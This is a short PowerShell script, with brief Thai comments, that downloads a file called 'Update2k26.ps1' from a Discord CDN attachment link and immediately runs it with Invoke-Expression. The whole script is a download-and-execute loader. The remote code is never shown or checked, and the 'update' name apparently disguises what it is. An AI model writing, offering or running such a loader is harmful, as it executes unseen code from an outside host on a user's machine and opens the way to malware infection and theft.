[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ไไไไ
$CoreLink = "https://cdn.discordapp.com/attachments/1526244895638159441/1526245370005422160/Update2k26.ps1?ex=6a565244&is=6a5500c4&hm=faad59a6c5f9f136ed085e122a3b8e6720960780bb80cab21e8c7b2c52f3262c&"

# ดึง
$code = Invoke-RestMethod -Uri $CoreLink -UseBasicParsing

# สั่งรัน
Invoke-Expression $code
